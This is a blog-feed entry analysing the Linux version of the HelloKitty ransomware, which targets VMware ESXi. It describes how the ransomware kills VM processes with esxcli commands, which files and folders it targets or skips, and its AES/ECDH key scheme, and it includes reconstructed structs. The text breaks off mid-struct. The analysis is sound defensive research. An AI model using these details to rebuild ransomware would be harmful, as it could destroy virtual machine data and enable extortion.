<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-07-18T05:19:28-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">HOME</title><subtitle>This website contains some usefull tutorials and my own write-ups for cyber security challenges</subtitle><entry><title type="html">HelloKitty Linux version malware analysis</title><link href="http://localhost:4000/2021/07/17/hellokitty_linux.html" rel="alternate" type="text/html" title="HelloKitty Linux version malware analysis" /><published>2021-07-17T12:08:00-05:00</published><updated>2021-07-17T12:08:00-05:00</updated><id>http://localhost:4000/2021/07/17/hellokitty_linux</id><content type="html" xml:base="http://localhost:4000/2021/07/17/hellokitty_linux.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;

&lt;h2 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;This report contains technical details of the new linux version of &lt;strong&gt;HelloKitty&lt;/strong&gt; that target VMware ESXi servers.&lt;/p&gt;

&lt;p&gt;The encryption used by this variant is &lt;strong&gt;AES_CBC&lt;/strong&gt; and &lt;strong&gt;Elliptic-curve Diffie–Hellman (ECDH)&lt;/strong&gt; to protect the keys.&lt;/p&gt;

&lt;h2 id=&quot;encryption-overview&quot;&gt;&lt;strong&gt;Encryption Overview&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The malware generates an &lt;strong&gt;ECDH&lt;/strong&gt; keypair, then using the hardcoded public key of the threat actor, it generates an &lt;strong&gt;ECDH secret&lt;/strong&gt; key.&lt;/p&gt;

&lt;p&gt;then an AES &lt;strong&gt;KEY/IV&lt;/strong&gt; are randomly generated at run time, this key will be used to encrypt a file.&lt;/p&gt;

&lt;p&gt;Note: the AES &lt;strong&gt;KEY/IV&lt;/strong&gt; are different each file.&lt;/p&gt;

&lt;p&gt;The AES &lt;strong&gt;KEY/IV&lt;/strong&gt; is encrypted using a randomly generated &lt;strong&gt;IV&lt;/strong&gt; and the previous &lt;strong&gt;ECDH secret&lt;/strong&gt; key with AES algorithm.&lt;/p&gt;

&lt;p&gt;Finally a structure is populated with the ECDH public key of the malware, the AES &lt;strong&gt;KEY/IV&lt;/strong&gt; used for file encryption and other stuff.&lt;/p&gt;

&lt;p&gt;The structure is appended with the ransom note and the encrypted file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.crypt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The Threat actor can recover the &lt;strong&gt;ECDH secret&lt;/strong&gt; to decrypt the encrypted &lt;strong&gt;AES KEY/IV&lt;/strong&gt; used for encrypting the file with his Private ECDH key and the malware Public ECDH key.&lt;/p&gt;

&lt;h3 id=&quot;ransom-note&quot;&gt;&lt;strong&gt;Ransom Note&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717151158.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Ransom note&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;technical-analysis&quot;&gt;&lt;strong&gt;Technical Analysis&lt;/strong&gt;&lt;/h2&gt;

&lt;h3 id=&quot;commandline-arguments&quot;&gt;&lt;strong&gt;CommandLine arguments&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717151841.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Parsing commandLine arguments&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;option&lt;/th&gt;
      &lt;th&gt;Functionality&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-k&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Kill VM processes&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-d&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Run as daemon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-e&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Encrypt VM files&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;-v&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Enable verbose&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;dynamically-loading-libcrypto-api&quot;&gt;&lt;strong&gt;Dynamically loading libcrypto API&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;The malware loads some OpenSSL API from &lt;strong&gt;libcrypto.so&lt;/strong&gt; using &lt;strong&gt;dlopen&lt;/strong&gt;/&lt;strong&gt;dlsym&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716122823.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Dynamically loading libcrypto API&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Looking at the array, we can see that each entry is a structure of 3 pointers:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_function_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_function_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pointer_to_api&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;First the ransomware tries to get the address of the function name stored in &lt;strong&gt;new_function_name&lt;/strong&gt;, if not found (which means the library is old) it uses &lt;strong&gt;old_function_name&lt;/strong&gt;, if the API was found , it’s pointer will be stored in &lt;strong&gt;pointer_to_api&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716123130.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Array of libcrypto API names and addresses&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716123512.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can rename the &lt;strong&gt;pointer_to_api&lt;/strong&gt; with this pythonIDA script, it gets &lt;strong&gt;new_function_name&lt;/strong&gt; string and it then set the name for &lt;strong&gt;pointer_to_api&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_name_ea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;array_func_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;func_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_strlit_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Qword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;set_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    
	&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ignores-signals&quot;&gt;&lt;strong&gt;Ignores signals&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;The malware will ignore the following signals, so that it won’t be interrupted during encryption, this will prevent half encrypting files which leads to file corruption.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;SIGCHLD&lt;/li&gt;
  &lt;li&gt;SIGTSTP&lt;/li&gt;
  &lt;li&gt;SIGTTOU&lt;/li&gt;
  &lt;li&gt;SIGTTIN&lt;/li&gt;
  &lt;li&gt;SIGHUP&lt;/li&gt;
  &lt;li&gt;SIGTERM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716125101.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Figure: Malware ignores some signals&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;list-vm-processes&quot;&gt;&lt;strong&gt;List VM processes&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;It executes the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esxcli vm process list&lt;/code&gt; to list every VirtualMachine processes currently running on the infected machine.
It then parses through the output to extract &lt;strong&gt;Process ID&lt;/strong&gt; and &lt;strong&gt;Config File&lt;/strong&gt; which is basically the path to the &lt;strong&gt;VMX file of the VM&lt;/strong&gt;
This data is saved in a array of stucture of type&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
	uint64_t Process_ID;
	unsigned char *Vmx_Path;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;kill-vm-porcesses&quot;&gt;&lt;strong&gt;kill VM porcesses&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;Using the previous array, the malware first tries to kill the processes with a soft kill &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esxcli vm process kill -t=soft -w=&amp;lt;Process_PID&amp;gt;&lt;/code&gt; if it fails it uses a hard kill option &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esxcli vm process kill -t=hard -w=&amp;lt;Process_PID&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;recursive-file-search&quot;&gt;&lt;strong&gt;Recursive file search&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;It uses the paths given as command line arguments and explore recursively the directories using &lt;strong&gt;opendir&lt;/strong&gt; &lt;strong&gt;readdir&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;For each file read, it first checks if the file is not &lt;strong&gt;.&lt;/strong&gt; or &lt;strong&gt;..&lt;/strong&gt; and does not contain the strings &lt;strong&gt;.crypt&lt;/strong&gt; or &lt;strong&gt;.README_TO_RESTORE&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716155659.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;switch-file-type&quot;&gt;&lt;strong&gt;Switch (file type)&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 id=&quot;case-directory&quot;&gt;&lt;strong&gt;case directory:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;It checks if it is not one of the following directories:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;/bin&lt;/li&gt;
  &lt;li&gt;/boot&lt;/li&gt;
  &lt;li&gt;/dev&lt;/li&gt;
  &lt;li&gt;/etc&lt;/li&gt;
  &lt;li&gt;/lib&lt;/li&gt;
  &lt;li&gt;/lib32&lt;/li&gt;
  &lt;li&gt;/lib64&lt;/li&gt;
  &lt;li&gt;/lost+found&lt;/li&gt;
  &lt;li&gt;/proc&lt;/li&gt;
  &lt;li&gt;/run&lt;/li&gt;
  &lt;li&gt;/sbin&lt;/li&gt;
  &lt;li&gt;/usr/bin&lt;/li&gt;
  &lt;li&gt;/usr/include&lt;/li&gt;
  &lt;li&gt;/usr/lib&lt;/li&gt;
  &lt;li&gt;/usr/lib32&lt;/li&gt;
  &lt;li&gt;/usr/lib64&lt;/li&gt;
  &lt;li&gt;/usr/sbin&lt;/li&gt;
  &lt;li&gt;/sys&lt;/li&gt;
  &lt;li&gt;/usr/libexec&lt;/li&gt;
  &lt;li&gt;/usr/share&lt;/li&gt;
  &lt;li&gt;/var/lib&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In case the check pass, it calls recursively the same function with the new directory path as argument.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716160535.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Recursive directory search&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;case-file&quot;&gt;&lt;strong&gt;case file:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;In case it was a file and the &lt;strong&gt;-e&lt;/strong&gt; option was specified in command line arguments, it will check if the file does not contain the following strings &lt;strong&gt;.crypt, .tmp_, .README_TO_RESTORE&lt;/strong&gt;, then checks if it contains one of the following strings&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;.vmdk&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;.vmx&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;.vmsd&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;.vmsn&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716162649.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;if &lt;strong&gt;-e&lt;/strong&gt; was not specified, it will check if the filename does not contain one of the following strings&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;.crypt&lt;/li&gt;
  &lt;li&gt;.READ_ME_TO_RESTORE&lt;/li&gt;
  &lt;li&gt;.tmp_&lt;/li&gt;
  &lt;li&gt;.a&lt;/li&gt;
  &lt;li&gt;.so&lt;/li&gt;
  &lt;li&gt;.la&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally if the size of the file is bigger than 256 bytes, it saves the path to the file for later usage (encrypting it… of course)&lt;/p&gt;

&lt;h3 id=&quot;switch-to-daemon-process&quot;&gt;&lt;strong&gt;switch to daemon process&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;If the &lt;strong&gt;-d&lt;/strong&gt; option was specified in command line arguments the malware calls &lt;strong&gt;daemon&lt;/strong&gt; to detach itself from the controlling terminal and run in the background as system daemons.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716162752.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Figure: Detach and run as daemon&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;start-thread&quot;&gt;&lt;strong&gt;start thread&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;it starts a thread at address &lt;strong&gt;0x402AA2&lt;/strong&gt;
then creates 2 strings, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename + .crypt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename + .tmp_&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716163420.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A function is called that tries to set a lock on the file using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fcntl&lt;/code&gt;, if it fails it will get the PID of the process that is currently locking the file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716164904.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Malware try to set a lock on the file&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If the PID is greater than 10 (not a system process), it will kill it with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kill -9 &amp;lt;PID&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716165020.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It then rename the file to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename + .tmp_&lt;/code&gt;
then it will call a function (&lt;strong&gt;0x405D64&lt;/strong&gt;) to encrypt the file. 
In case of failure it will roll back to the original filename&lt;/p&gt;

&lt;p&gt;In case of successful encryption it will rename the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tmp_&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.crypt&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;encryption&quot;&gt;&lt;strong&gt;Encryption&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 id=&quot;generation-of-keys&quot;&gt;&lt;strong&gt;Generation of keys&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;It derives an &lt;strong&gt;AES_256_CBC&lt;/strong&gt; &lt;strong&gt;KEY&lt;/strong&gt; and &lt;strong&gt;IV&lt;/strong&gt; with libcrypto function &lt;strong&gt;EVP_BytesToKey&lt;/strong&gt; with a randomly generated &lt;strong&gt;salt&lt;/strong&gt; and &lt;strong&gt;data&lt;/strong&gt; using &lt;strong&gt;RAND_bytes API&lt;/strong&gt; that will be used for file content encryption.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716181215.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Figure: Generate AES KEY/IV&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716180856.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Official documentation of OpenSSL API https://www.openssl.org/docs/man1.0.2/man3/EVP_BytesToKey.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then it generates the malware ECDH private/public keys.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717160601.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Generate client ECDH keypair&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Next it will call a function at address &lt;strong&gt;0x4054F1&lt;/strong&gt; (I named it &lt;strong&gt;func_compute_secret&lt;/strong&gt;) with the newly generate &lt;strong&gt;EC_KEY&lt;/strong&gt; and the public key of the author&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716185043.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716185241.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Author public key&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then It calls libcrypto api &lt;strong&gt;ECDH_compute_key&lt;/strong&gt; to generate an &lt;strong&gt;ECDH shared secret&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716185432.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Generate ECDH secret&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After that it populate a custom structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(I named it custom_structure00)&lt;/code&gt; of the following type with the &lt;strong&gt;AES KEY, IV&lt;/strong&gt; and the size of the file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;save_AES_IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;save_AES_KEY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;size_of_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;defined_constant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;alignemnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_structure00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716192439.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Populate the above structure with AES key data&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716220552.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Example of the structure populated with data&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then it encrypts the structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;custom_structure00&lt;/code&gt; using the &lt;strong&gt;ECDH secret&lt;/strong&gt; and a randomly generated &lt;strong&gt;IV&lt;/strong&gt; of 16 bytes with AES algorithm.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716192621.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Figure: Encrypt the above structure with the &lt;strong&gt;ECDH secret&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After that, it populates yet another important structure &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;custom_structure01&lt;/code&gt; of following type:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// The IV used to encrypt the custom_structure00 structure. | offset 0 - 0x10&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret_IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// The size of custom_structure00 | offset 0x10 - 0x14&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size_of_custom_structure00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// Encrypted custom_structure00 | offset 0x14 - 0x34&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;custom_structure00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_custom_structure00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// Size of the client public key | offset 0x58 - x5c&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size_of_public_key&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// Client public key | offset 0x5c - 0xa0&lt;/span&gt;
